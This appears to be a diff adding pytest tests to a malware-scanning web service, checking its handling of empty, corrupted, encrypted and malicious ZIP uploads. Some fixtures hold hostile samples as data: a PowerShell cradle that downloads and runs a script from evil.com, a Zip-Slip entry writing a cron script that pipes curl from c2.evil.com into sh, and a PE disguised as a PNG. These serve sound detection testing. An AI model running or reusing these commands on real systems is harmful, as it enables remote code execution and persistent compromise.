@@ -244,3 +244,209 @@ async def test_real_world_malware_carrier_kit_detection():
     assert any("Malware Dropper" in t for t in rec4.threat_signatures)
 
 
+@pytest.mark.anyio
+async def test_empty_zip_archive_handling():
+    """Test that empty ZIP archives (PK\\x05\\x06) are correctly identified, audited, and released clean."""
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        pass
+    empty_bytes = buf.getvalue()
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        files = {"file": ("empty_container.zip", empty_bytes, "application/zip")}
+        resp = await client.post("/api/scan/file", files=files)
+        assert resp.status_code == 200
+        data = resp.json()
+
+        assert data["magic_mime"] == "application/zip"
+        assert data["state"] == ScanState.CLEAN.value
+        assert data["release_policy"] == ReleasePolicy.ALLOWED.value
+        assert any("Empty archive" in f for f in data["findings"])
+
+        # Check safe release gate
+        dl_resp = await client.get(f"/api/scan/{data['scan_id']}/download")
+        assert dl_resp.status_code == 200
+        assert dl_resp.content == empty_bytes
+
+
+@pytest.mark.anyio
+async def test_valid_nested_zip_archive():
+    """Test valid ZIP archive with nested directories, multiple files, and member breakdown."""
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("subfolder/", b"")  # Directory entry
+        zf.writestr("subfolder/readme.txt", b"CyberKawach nested clean documentation.")
+        zf.writestr("subfolder/data/metrics.csv", b"timestamp,score\n2026-10-20,99.9\n")
+    valid_bytes = buf.getvalue()
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        files = {"file": ("project_bundle.zip", valid_bytes, "application/zip")}
+        resp = await client.post("/api/scan/file", files=files)
+        assert resp.status_code == 200
+        data = resp.json()
+
+        assert data["magic_mime"] == "application/zip"
+        assert data["state"] == ScanState.CLEAN.value
+        assert data["release_policy"] == ReleasePolicy.ALLOWED.value
+        assert "archive_members" in data["deep_analysis"]
+        assert len(data["deep_analysis"]["archive_members"]) == 2
+        assert all(m["is_safe"] for m in data["deep_analysis"]["archive_members"])
+
+
+@pytest.mark.anyio
+async def test_corrupted_zip_archive_formats():
+    """Test that malformed, truncated, and fake non-PK files named .zip are blocked as SUSPICIOUS."""
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        # Case 1: Truncated PK header
+        corrupt_pk = b"PK\x03\x04\xff\xff\x00\x00truncated_header_data"
+        files1 = {"file": ("corrupted_header.zip", corrupt_pk, "application/zip")}
+        resp1 = await client.post("/api/scan/file", files=files1)
+        assert resp1.status_code == 200
+        data1 = resp1.json()
+        assert data1["state"] == ScanState.SUSPICIOUS.value
+        assert data1["release_policy"] == ReleasePolicy.BLOCKED.value
+        assert any("Corrupted or malformed" in f for f in data1["findings"])
+
+        # Case 2: Fake non-PK text file named .zip
+        fake_zip = b"Plain text file that is masquerading as a zip archive but has no PK headers."
+        files2 = {"file": ("fake_archive.zip", fake_zip, "application/zip")}
+        resp2 = await client.post("/api/scan/file", files=files2)
+        assert resp2.status_code == 200
+        data2 = resp2.json()
+        assert data2["state"] == ScanState.SUSPICIOUS.value
+        assert data2["release_policy"] == ReleasePolicy.BLOCKED.value
+        assert any("Corrupted or invalid archive format" in f for f in data2["findings"])
+
+
+@pytest.mark.anyio
+async def test_encrypted_password_protected_zip():
+    """Test that password-protected / encrypted archives are identified and quarantined."""
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.writestr("confidential.txt", b"Encrypted financial and user records.")
+    raw = bytearray(buf.getvalue())
+    # Set standard PKZIP encryption flag bit (bit 0) in both local and central directory headers
+    cd_idx = raw.find(b"PK\x01\x02")
+    if cd_idx != -1:
+        raw[cd_idx + 8] |= 0x1
+    local_idx = raw.find(b"PK\x03\x04")
+    if local_idx != -1:
+        raw[local_idx + 6] |= 0x1
+    encrypted_bytes = bytes(raw)
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        files = {"file": ("locked_vault.zip", encrypted_bytes, "application/zip")}
+        resp = await client.post("/api/scan/file", files=files)
+        assert resp.status_code == 200
+        data = resp.json()
+
+        assert data["state"] == ScanState.SUSPICIOUS.value
+        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
+        assert any("Encrypted / password-protected" in f for f in data["findings"])
+
+
+@pytest.mark.anyio
+async def test_deflated_malware_inside_zip():
+    """Test that compressed/deflated EICAR and PowerShell trojans inside innocent filenames are intercepted."""
+    # 1. Deflated EICAR inside innocent notes.txt
+    buf1 = io.BytesIO()
+    with zipfile.ZipFile(buf1, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("notes.txt", _EICAR_SIGNATURE)
+    eicar_zip = buf1.getvalue()
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        files1 = {"file": ("notes_archive.zip", eicar_zip, "application/zip")}
+        resp1 = await client.post("/api/scan/file", files=files1)
+        assert resp1.status_code == 200
+        data1 = resp1.json()
+        assert data1["state"] == ScanState.MALICIOUS.value
+        assert data1["release_policy"] == ReleasePolicy.BLOCKED.value
+        assert any("EICAR" in t for t in data1["threat_signatures"])
+
+        # 2. Deflated PowerShell dropper cradle inside innocent script.txt
+        buf2 = io.BytesIO()
+        ps_cradle = b"powershell.exe -ExecutionPolicy Bypass -Command iex (New-Object Net.WebClient).DownloadString('http://evil.com/trojan.ps1')"
+        with zipfile.ZipFile(buf2, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("script.txt", ps_cradle)
+        ps_zip = buf2.getvalue()
+
+        files2 = {"file": ("tool_archive.zip", ps_zip, "application/zip")}
+        resp2 = await client.post("/api/scan/file", files=files2)
+        assert resp2.status_code == 200
+        data2 = resp2.json()
+        assert data2["state"] == ScanState.MALICIOUS.value
+        assert data2["release_policy"] == ReleasePolicy.BLOCKED.value
+        assert any("PowerShell" in t for t in data2["threat_signatures"])
+
+
+@pytest.mark.anyio
+async def test_format_confusion_disguised_pe_inside_zip():
+    """Test format confusion inside archive: Windows PE disguised as an innocent image file."""
+    buf = io.BytesIO()
+    fake_img_pe = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 60 + b"BinaryPayload"
+    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("profile.png", fake_img_pe)
+    disguised_zip = buf.getvalue()
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        files = {"file": ("photos.zip", disguised_zip, "application/zip")}
+        resp = await client.post("/api/scan/file", files=files)
+        assert resp.status_code == 200
+        data = resp.json()
+
+        assert data["state"] == ScanState.MALICIOUS.value
+        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
+        assert any("Format Confusion" in t for t in data["threat_signatures"])
+
+
+@pytest.mark.anyio
+async def test_zip_slip_absolute_path_traversal():
+    """Test Zip-Slip exploit with absolute path (e.g. /etc/shadow or C:\\Windows\\System32)."""
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.writestr("/etc/cron.hourly/rootkit", b"#!/bin/bash\ncurl http://c2.evil.com | sh\n")
+    slip_bytes = buf.getvalue()
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        files = {"file": ("patch_traversal.zip", slip_bytes, "application/zip")}
+        resp = await client.post("/api/scan/file", files=files)
+        assert resp.status_code == 200
+        data = resp.json()
+
+        assert data["state"] == ScanState.MALICIOUS.value
+        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
+        assert any("Zip-Slip" in t for t in data["threat_signatures"])
+
+
+@pytest.mark.anyio
+async def test_folder_scan_with_single_zip_archive_unpacking():
+    """Test that uploading a single ZIP archive to the folder scan endpoint unpacks and audits all members."""
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.writestr("src/main.py", b"print('CyberKawach secure runner')")
+        zf.writestr("src/config.json", b'{"status": "ok"}')
+        zf.writestr("README.md", b"# CyberKawach Project")
+    zip_bytes = buf.getvalue()
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(transport=transport, base_url="http://test") as client:
+        files = [("files", ("test_project.zip", zip_bytes, "application/zip"))]
+        resp = await client.post("/api/scan/folder", files=files)
+        assert resp.status_code == 200
+        data = resp.json()
+
+        assert data["total_files"] == 3
+        assert data["clean_count"] == 3
+        assert data["overall_state"] == ScanState.CLEAN.value
+        assert data["overall_release_policy"] == ReleasePolicy.ALLOWED.value
+        assert len(data["file_records"]) == 3
+
+
+
